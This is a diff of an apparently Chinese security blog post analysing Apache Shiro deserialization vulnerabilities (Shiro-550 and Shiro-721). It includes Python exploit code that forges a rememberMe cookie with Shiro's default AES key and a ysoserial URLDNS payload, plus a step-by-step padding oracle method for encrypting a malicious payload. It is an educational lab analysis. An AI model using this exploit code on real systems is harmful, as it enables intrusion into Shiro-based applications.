@@ -80,8 +80,10 @@
 <meta property="og:image" content="https://0range228.github.io/images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195432687.png">
 <meta property="og:image" content="https://0range228.github.io/images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195807299.png">
 <meta property="og:image" content="https://0range228.github.io/images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211019100052257.png">
+<meta property="og:image" content="https://0range228.github.io/images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021004247569.png">
+<meta property="og:image" content="https://0range228.github.io/images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021012454772.png">
 <meta property="article:published_time" content="2021-09-09T11:28:28.000Z">
-<meta property="article:modified_time" content="2021-10-20T08:37:24.522Z">
+<meta property="article:modified_time" content="2021-10-20T17:25:09.160Z">
 <meta property="article:author" content="0range">
 <meta property="article:tag" content="shiro">
 <meta name="twitter:card" content="summary">
@@ -271,7 +273,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-20 16:37:24" itemprop="dateModified" datetime="2021-10-20T16:37:24+08:00">2021-10-20</time>
+                <time title="修改时间：2021-10-21 01:25:09" itemprop="dateModified" datetime="2021-10-21T01:25:09+08:00">2021-10-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -311,14 +313,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>8.4k</span>
+              <span>9.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>14 分钟</span>
+              <span>16 分钟</span>
             </span>
 
         </div>
@@ -385,8 +387,8 @@
 <p>两个重点：</p>
 <p>1- 跟进<code>getRememberedPrincipals</code>函数：</p>
 <p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909201721909.png" alt="image-20210909201721909"></p>
-<p>base64为rememberMe字段的value，需要先进行base64解码</p>
-<p>2- 跟进<code>convertBytesToPrincipals</code>函数</p>
+<p>base64为rememberMe字段的value，需要先进行base64解码，返回解密内容</p>
+<p>2- 跟进<code>convertBytesToPrincipals</code>函数，参数bytes存放的是base64解密内容</p>
 <p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223451788.png" alt="image-20210909223451788"></p>
 <p><img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210909223605212.png" alt="image-20210909223605212"></p>
 <p>可以看到先AES解密，再反序列化</p>
@@ -412,7 +414,7 @@
 <ol start="3">
 <li>触发断点，可以继续跟解密步骤了</li>
 </ol>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这里结合URLDNS打一下：</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里结合URLDNS打一下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"http://127.0.0.1:8081/samples_web_war_exploded/"</span></span><br><span class="line">jar_file = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 rememberme的值</span></span><br><span class="line">popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>, jar_file, <span class="string">"URLDNS"</span>, <span class="string">"http://mfn1qr.dnslog.cn"</span>],</span><br><span class="line">						 stdout=subprocess.PIPE)</span><br><span class="line">BS = AES.block_size</span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</span><br><span class="line">file_body = pad(popen.stdout.read())</span><br><span class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送get请求</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	traceback.print_exc()</span><br></pre></td></tr></table></figure>
 
 
@@ -605,18 +607,18 @@
 <img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211018195807299.png" alt="image-20211018195807299" style="zoom:50%;">
 
 <p>只要padding错误，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p>
-<h3 id="前提1-攻击者拥有正常用户的rememberMe字段"><a href="#前提1-攻击者拥有正常用户的rememberMe字段" class="headerlink" title="前提1: 攻击者拥有正常用户的rememberMe字段"></a>前提1: 攻击者拥有正常用户的rememberMe字段</h3><p>shiro的rememberMe中存放的是：前16字节为IV，后面为AES加密之后的密文</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="前提1-攻击者拥有正常用户的rememberMe字段"><a href="#前提1-攻击者拥有正常用户的rememberMe字段" class="headerlink" title="前提1: 攻击者拥有正常用户的rememberMe字段"></a>前提1: 攻击者拥有正常用户的rememberMe字段</h3><p>shiro的rememberMe中存放的是：前16字节为IV，后面为AES加密之后的密文</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_text</span><span class="params">(RememberMe_cookie)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> base64.b64decode(RememberMe_cookie)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(encrypted_text)</span>:</span></span><br><span class="line">	key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">	IV  = encrypted_text[:<span class="number">16</span>]</span><br><span class="line">	remember_bin = AES.new(base64.b64decode(key), AES.MODE_CBC, IV=IV).decrypt(encrypted_text[<span class="number">16</span>:])</span><br><span class="line">	<span class="keyword">return</span> remember_bin</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">()</span>:</span></span><br><span class="line">	cookie = <span class="string">'oDH/OY3qZfZpZm1RFaA1DmI4p5H3EoqZ68EXtik2MykvTm/eRECW8vEBUCHC06MbEWfOyUwH58DwO9wdnTwgJNqx5x6slvWck6JX3wLZVn3sENcTFn3CstloTZKQ6vp1lh0YHyb631QLPjeZ3LutBu8hU7omax9AYffVggodgAuAdaiA9beWb4rntBLh3s0RAs7HDwypm+qvUOM1FghD3+KON/C3bCTyjk/x+NCHaMJif6pUY/n0eTvl17WTLIYY1PygQBtxDuMtpsIZUkEZPMaBSLwXyzJIY34iWMleTKqlSk5i3zy9MufA2OR/dJjZfFdpIV2j5YJleEFnbjOhDtU7dOG38Y4uHwEnxKQgFcJNKETUKD6Blrw3/7orH6Ay9J1EFEw2dXhrWBhSvHuZ1AL3rn96vcvWUSIMZqpFDXTz0gqgLa0n397U/WPF188nqPNOPV2JT4mW6Xhkhwl6kUmIE7TxhT04Xms5g4qAjiWAsdOs5V+Kw/c/TqNNroFI'</span></span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"rememberMe.bin"</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">		f.write(decode(get_encrypted_text(cookie)))</span><br><span class="line"></span><br><span class="line">crack()</span><br></pre></td></tr></table></figure>
 
 <p>熟悉的aced0005～</p>
+<p>注意，最后一行都是0x10，说明已经是填充过后的了</p>
 <img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211019100052257.png" alt="image-20211019100052257" style="zoom:50%;">
 
 
 
 <h3 id="前提2：Java反序列化格式"><a href="#前提2：Java反序列化格式" class="headerlink" title="前提2：Java反序列化格式"></a>前提2：Java反序列化格式</h3><p>Java反序列化是按照字节流的格式进行读取，反序列化数据末尾存在脏数据不会报错。</p>
 <p>这是因为：readobject读取的serialdata长度是在serialdata头部就约定好的。</p>
-<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>利用原理是攻击者将正常用户的rememberMe拿到，使用Padding Oracle Attack对正常的rememberMe进行加密</p>
-<p>令</p>
+<h3 id="payload构造原理"><a href="#payload构造原理" class="headerlink" title="payload构造原理"></a>payload构造原理</h3><p>原理是攻击者将正常用户的rememberMe拿到，使用不断的Padding Oracle Attack对我们的恶意反序列化payload编写密文，进行加密。</p>
 <p>经过调试，我们可以知道：</p>
 <ol>
 <li><p>当用户的cookie认证失败，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p>
@@ -624,9 +626,36 @@
 <li><p>只要padding错误，服务端就会返回一个cookie: <strong>rememberMe=deleteMe;</strong></p>
 </li>
 </ol>
-<p>复习一遍流程：</p>
-<p>token -(序列化)-&gt; token_serilized(aced0005…) -(AES_Enc)-&gt; cipher -(Base64)-&gt; rememberMe</p>
-<p>rememberMe -(Base64)-&gt;cipher-(AES_Dec)-&gt;token_serilized(aced0005…)-(反序列化)-&gt;token</p>
+<p>所以我们只要在AES密文(rememberMe经过Base64解密之后的值)后面添加脏数据，解密之后符合padding model就可以绕过了。</p>
+<p>复习一遍Shiro加解密流程：</p>
+<p>加密：token -(序列化)-&gt; token_serilized(aced0005…) -(AES_Enc)-&gt; cipher -(Base64)-&gt; rememberMe</p>
+<p>解密：rememberMe -(Base64)-&gt;cipher-(AES_Dec)-&gt;token_serilized(aced0005…)-(反序列化)-&gt;token</p>
+<img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021004247569.png" alt="image-20211021004247569" style="zoom:50%;">
+
+<p>审计了一下<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">longofo</a>师傅的项目，终于搞懂了最终的payload是怎么生成的。</p>
+<p>假设现在yso.bin是我们的恶意payload，它作为明文首先要被分组，最后一列填充，倒序排列。</p>
+<p>为什么倒序排列？因为遍历明文时候，第一组其实就是明文的最后一组，构造我们的恶意密文的方向其实是从后向前的。</p>
+<p>首先生成一组脏数据X，这组脏数据会放在最终payload的最后一组，规范一点，X被0-127任意值填充。</p>
+<p>我们需要的是：</p>
+<ol>
+<li>正常的rememberMe</li>
+<li>二元组：0x00*16+X</li>
+</ol>
+<img src="../images/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211021012454772.png" alt="image-20211021012454772" style="zoom:50%;">
+
+<p>接下来使用padding oracle attack去加密这些分组，怎么做？爆破！</p>
+<p>rememberMe+0x00*16+X发送给server，padding oracle attack 获得X对应的tempIV。</p>
+<p>我们希望X的解密结果是我们Payload的最后一组，所以我们有：</p>
+<p>P[n] XOR tempIV = C[n-1]</p>
+<p>也就是说，我们知道X这组的middle是tempIV，知道明文P[n]，我们就可以通异或，定制化倒数第二组密文。</p>
+<p>之后继续这样做，构建二元组，rememberMe+0x00*16+C[n-1]，发送给服务器，获得倒数第二组的tempIV，再与我们的倒数第二组明文进行异或，得到倒数第三段密文。</p>
+<p>这样不断向前推导，可以获得IV+C，对它进行Base64加密，这串就是新的rememberMe。</p>
+<p>当Shiro解密时，AES解密结果decoded就是我们的恶意payload（肯定符合padding model 是因为我们的payload前期已经处理过了，已经做好了填充），直接参与反序列化，触发漏洞。</p>
+<p>Shiro对AES解密的结果只校验了是否符合padding model，符合就无脑去反序列化，这也是漏洞成因的关键所在。<br>我们payload最后其实是有一串脏数据的（那一串被随机数填满的），但是这并不影响反序列化，因为反序列化读取是有自己的规范的，只读serialdata指定长度，反完走人，后面多出来的不管。</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>老洞新看，发现很多师傅的文章中，没有讲最终的payload是如何生成的，自己尝试玩了几天，还是很有收获的。</p>
+<p>感谢<a href="https://github.com/Zebork" target="_blank" rel="noopener">Zebork</a>师兄与我一起头脑风暴，Padding Oracle Attack那块确实很有意思^ _ ^</p>
+<p>参考：</p>
+<p><a href="https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data" target="_blank" rel="noopener">Going the other way with padding oracles: Encrypting arbitrary data!</a><br><a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">工具：PaddingOracleAttack-Shiro-721</a><br><a href="https://issues.apache.org/jira/browse/SHIRO-721" target="_blank" rel="noopener">Shiro721公告</a><br><a href="https://tomassky.github.io/2020/08/30/shiro_unserialize/" target="_blank" rel="noopener">利用：Shiro反序列化漏洞</a><br><a href="https://lightless.me/archives/padding-oracle-attacks.html" target="_blank" rel="noopener">Padding Oracle Attack 浅析</a><br><a href="https://www.mi1k7ea.com/2020/09/17/%E6%B5%85%E6%9E%90CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E4%B8%8EPadding-Oracle-Attack/" target="_blank" rel="noopener">Mi1k7ea：浅析CBC字节翻转攻击与Padding Oracle Attack</a><br><a href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/" target="_blank" rel="noopener">Mi1k7ea：浅析Shiro Padding Oracle Attack（Shiro721）</a><br><a href="https://www.anquanke.com/post/id/203869#h3-2" target="_blank" rel="noopener">从更深层面看Shiro Padding Oracle漏洞</a><br><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated" target="_blank" rel="noopener">ShiroExploit检测工具</a><br><a href="https://mp.weixin.qq.com/s/j_gx9C_xL1LyrnuFFPFsfg" target="_blank" rel="noopener">Shiro组件漏洞与攻击链分析</a></p>
 
     </div>
 
@@ -711,7 +740,7 @@
       -->
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序言"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Shiro-简介"><span class="nav-number">2.</span> <span class="nav-text">Apache Shiro 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro-550"><span class="nav-number">3.</span> <span class="nav-text">Shiro-550</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">3.2.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#加密"><span class="nav-number">3.2.1.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解密"><span class="nav-number">3.2.2.</span> <span class="nav-text">解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试小记"><span class="nav-number">3.2.3.</span> <span class="nav-text">调试小记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用"><span class="nav-number">3.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro-721"><span class="nav-number">4.</span> <span class="nav-text">Shiro-721</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">4.1.</span> <span class="nav-text">背景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AES加密模式"><span class="nav-number">4.1.1.</span> <span class="nav-text">AES加密模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分组模式"><span class="nav-number">4.1.2.</span> <span class="nav-text">分组模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC-模式"><span class="nav-number">4.1.3.</span> <span class="nav-text">CBC 模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-填充模式"><span class="nav-number">4.1.4.</span> <span class="nav-text">Padding 填充模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-number">4.1.5.</span> <span class="nav-text">Padding Oracle Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解密：破解明文"><span class="nav-number">4.1.5.1.</span> <span class="nav-text">解密：破解明文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加密：篡改明文"><span class="nav-number">4.1.5.2.</span> <span class="nav-text">加密：篡改明文</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC翻转攻击"><span class="nav-number">4.1.6.</span> <span class="nav-text">CBC翻转攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试-1"><span class="nav-number">4.2.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">4.2.0.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前提1-攻击者拥有正常用户的rememberMe字段"><span class="nav-number">4.2.1.</span> <span class="nav-text">前提1: 攻击者拥有正常用户的rememberMe字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前提2：Java反序列化格式"><span class="nav-number">4.2.2.</span> <span class="nav-text">前提2：Java反序列化格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击利用"><span class="nav-number">4.2.3.</span> <span class="nav-text">攻击利用</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序言"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache-Shiro-简介"><span class="nav-number">2.</span> <span class="nav-text">Apache Shiro 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro-550"><span class="nav-number">3.</span> <span class="nav-text">Shiro-550</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">3.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试"><span class="nav-number">3.2.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#加密"><span class="nav-number">3.2.1.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解密"><span class="nav-number">3.2.2.</span> <span class="nav-text">解密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调试小记"><span class="nav-number">3.2.3.</span> <span class="nav-text">调试小记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro-721"><span class="nav-number">4.</span> <span class="nav-text">Shiro-721</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">4.1.</span> <span class="nav-text">背景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AES加密模式"><span class="nav-number">4.1.1.</span> <span class="nav-text">AES加密模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分组模式"><span class="nav-number">4.1.2.</span> <span class="nav-text">分组模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC-模式"><span class="nav-number">4.1.3.</span> <span class="nav-text">CBC 模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-填充模式"><span class="nav-number">4.1.4.</span> <span class="nav-text">Padding 填充模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-number">4.1.5.</span> <span class="nav-text">Padding Oracle Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#解密：破解明文"><span class="nav-number">4.1.5.1.</span> <span class="nav-text">解密：破解明文</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加密：篡改明文"><span class="nav-number">4.1.5.2.</span> <span class="nav-text">加密：篡改明文</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC翻转攻击"><span class="nav-number">4.1.6.</span> <span class="nav-text">CBC翻转攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#调试-1"><span class="nav-number">4.2.</span> <span class="nav-text">调试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#"><span class="nav-number">4.2.0.1.</span> <span class="nav-text"></span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前提1-攻击者拥有正常用户的rememberMe字段"><span class="nav-number">4.3.1.</span> <span class="nav-text">前提1: 攻击者拥有正常用户的rememberMe字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前提2：Java反序列化格式"><span class="nav-number">4.3.2.</span> <span class="nav-text">前提2：Java反序列化格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload构造原理"><span class="nav-number">4.3.3.</span> <span class="nav-text">payload构造原理</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结尾"><span class="nav-number">5.</span> <span class="nav-text">结尾</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -826,12 +855,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">747k</span>
+    <span title="站点总字数">748k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:45</span>
+    <span title="站点阅读时长">20:47</span>
   -->
 
 </div>
